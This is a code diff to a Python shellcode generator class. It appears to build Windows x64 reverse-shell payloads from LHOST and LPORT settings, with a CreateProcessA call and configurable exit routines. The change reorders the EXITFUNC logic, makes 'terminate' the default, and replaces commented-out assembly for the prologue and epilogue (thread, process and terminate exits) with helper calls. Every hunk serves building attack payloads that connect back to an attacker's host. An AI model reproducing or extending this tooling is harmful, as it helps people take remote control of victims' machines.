@@ -139,20 +139,6 @@ class Shellcode():
 
         self.lhost = argv_dict['LHOST']
 
-        # Set the EXITFUNC
-        if "EXITFUNC" not in argv_dict.keys():
-            self.exit_func = ""
-        else:
-            self.exit_func = argv_dict["EXITFUNC"]
-
-        # Update the necessary dependencies
-        if self.exit_func == "thread":
-            self.dependencies["ntdll.dll"] = "RtlExitUserThread",
-        elif self.exit_func == "process":
-            self.dependencies["Kernel32.dll"] += "ExitProcess",
-        else:
-            self.dependencies["Kernel32.dll"] += "TerminateProcess",
-
         # Change the shellcode operation based on how execution will be performed
         if "OP_AS_FUNC" not in argv_dict.keys():
             self.op_as_func = False
@@ -161,6 +147,22 @@ class Shellcode():
                 self.op_as_func = False
             else:
                 self.op_as_func = True
+
+        # Set the EXITFUNC and update the necessary dependencies
+        self.exit_func = ""
+        if "EXITFUNC" not in argv_dict.keys():
+            if self.op_as_func == False:
+                self.exit_func = "terminate"
+        else:
+            self.exit_func = argv_dict["EXITFUNC"] 
+
+        # Update the necessary dependencies
+        if self.exit_func == "terminate":
+            self.dependencies["Kernel32.dll"] += "TerminateProcess",
+        elif self.exit_func == "thread":
+            self.dependencies["ntdll.dll"] = "RtlExitUserThread",
+        elif self.exit_func == "process":
+            self.dependencies["Kernel32.dll"] += "ExitProcess",
 
         return 0
 
@@ -316,30 +318,8 @@ get_{imports[func]}:
         sin_port = struct.pack('<H', self.lport).hex()
         sin_family = struct.pack('>H', ws2def.AF_INET).hex()
 
-        shellcode = stubhub.get_win_prologue(self.op_as_func, self.stack_space)
-
-#        shellcode = """
-#_start:
-#"""
-#        if self.op_as_func == True:
-#            shellcode += """
-#    push rbp
-#    mov rbp, rsp
-#            """
-#        
-#        shellcode += f"""
-#    sub rsp, {self.stack_space}
-#"""
-#
-#        if self.op_as_func == False:
-#            shellcode += """
-#    and rsp, 0xfffffffffffffff0
-#            """
-#
-        shellcode += """
-    call getKernel32
-    mov rdi, rax
-"""
+        shellcode = stubhub.get_win_prologue(self.op_as_func,
+                                             self.stack_space)
 
         shellcode += self.resolve_functions()
 
@@ -436,41 +416,6 @@ call_CreateProccessA:
 
 """
 
-#        if self.exit_func == "thread":
-#            shellcode += f"""
-#; RAX => RtlExitUserThread([in] DWORD dwExitCode); // RCX => 0
-#call_RtlExitUserThread:
-#    xor rcx, rcx
-#    mov rax, [rbp - {self.storage_offsets['RtlExitUserThread']}]
-#    call rax
-#            """
-#        elif self.exit_func == "process":
-#            shellcode += f"""
-#; RAX => ExitProcess([in] UINT uExitCode); // RCX => 0
-#call_ExitProcess:
-#    xor rcx, rcx
-#    mov rax, [rbp - {self.storage_offsets['ExitProcess']}]
-#    call rax
-#            """
-#        elif self.exit_func == "terminate":
-#            shellcode += f"""
-#; RAX => TerminateProcess([in] HANDLE hProcess,   // RCX => -1 (Current Process)
-#;                         [in] UINT   uExitCode); // RDX => 0x00 (Clean Exit)
-#call_TerminateProcess:
-#	xor rcx, rcx
-#	dec rcx
-#	xor rdx, rdx
-#	mov rax, [rbp - {self.storage_offsets['TerminateProcess']}]
-#	call rax
-#            """
-#
-#        if self.op_as_func == True:
-#            shellcode += """
-#fin:
-#    leave
-#    ret
-#            """
-
         shellcode += stubhub.get_win_epilogue(self.op_as_func,
                                               self.exit_func,
                                               self.storage_offsets)
@@ -478,8 +423,6 @@ call_CreateProccessA:
         shellcode += self.get_kernel32()
 
         shellcode += self.lookup_function()
-
-        print(shellcode)
 
         return shellcode
 
